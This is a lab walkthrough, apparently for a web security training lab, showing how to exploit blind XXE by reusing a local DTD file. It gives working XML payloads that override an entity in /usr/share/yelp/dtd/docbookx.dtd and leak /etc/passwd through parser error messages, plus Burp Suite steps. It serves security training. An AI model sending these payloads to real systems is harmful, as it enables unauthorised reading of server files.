# ‚ú® Exploiting Blind XXE with Local DTD Reuse ‚ú®

---

## üîé Understanding the Technique

This technique exploits blind XXE vulnerabilities when out-of-band (OOB) interactions are blocked. It involves:

- Using hybrid internal and external DTD declarations.
- Reusing a local DTD file on the server.
- Triggering XML parsing errors to exfiltrate sensitive data.

### Key Characteristics:
1. External DTD declarations cannot be loaded from remote servers due to OOB restrictions.
2. Internal DTDs can override entities from local external DTDs.
3. Parsing errors contain sensitive information.

---

### Example Attack Scenario

Assume a local DTD file exists at `/usr/local/app/schema.dtd` and defines an entity named `custom_entity`. An attacker can exploit this by sending the following malicious XML:

```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

### Steps:
1. **Define a parameter entity** (`local_dtd`) containing the local external DTD.
2. **Override the external entity** (`custom_entity`) with a malicious definition.
3. **Include the overridden entity** via the `local_dtd` parameter, triggering a parsing error.

---

## üîß Step-by-Step Lab Guide

This lab contains a **"Stock Check"** feature that parses XML input but does not display results. Let‚Äôs use it to exfiltrate `/etc/passwd` contents:

---

### ‚úÖ Step 1: Navigate to a Product

Locate the product list and select any product:

![Screenshot 1](https://github.com/user-attachments/assets/420f18e2-6900-4413-81f2-7cc5c6103444)

---

### ‚úÖ Step 2: Trigger Stock Check

Scroll down and click **"Check Stock"**, with Burp Proxy enabled:

![Screenshot 2](https://github.com/user-attachments/assets/c12710e3-0520-47a9-b507-1bb41849a7df)

---

### ‚úÖ Step 3: Intercept the Request

In **Burp Suite**, open `Proxy -> HTTP History`, find the `POST` request to `/product/stock`, and send it to **Repeater**:

![Screenshot 3](https://github.com/user-attachments/assets/f2febc3e-4ab7-441e-8fb3-04990746f99f)

---

### ‚úÖ Step 4: Insert the Malicious DTD

Replace the payload with the following DTD definition:

```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

![Screenshot 4](https://github.com/user-attachments/assets/87784678-071c-4e1f-a766-b4add7e516cd)

---

### ‚úÖ Step 5: Extract the Data

Send the request to retrieve `/etc/passwd` contents through the error output:

![Screenshot 5](https://github.com/user-attachments/assets/e6f9df34-6e44-46ea-81f9-16d3e6848ab3)

---

## üîç Finding a Local DTD for Reuse

1. **Identify existing DTD files:**
   - Check common paths like `/usr/share/yelp/dtd/docbookx.dtd`.

2. **Verify existence:**
   - Send a minimal payload to check file accessibility:

```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```

3. **Analyze the DTD:**
   - Find publicly available copies of DTD files online to identify overridable entities.

---

## üöÄ Conclusion

This attack demonstrates how blind XXE vulnerabilities can be exploited even under strict OOB restrictions by reusing local DTD files on the server. It highlights the importance of:

- Restricting DTD processing in XML parsers.
- Limiting server access to sensitive files.

Happy hacking! üòâ
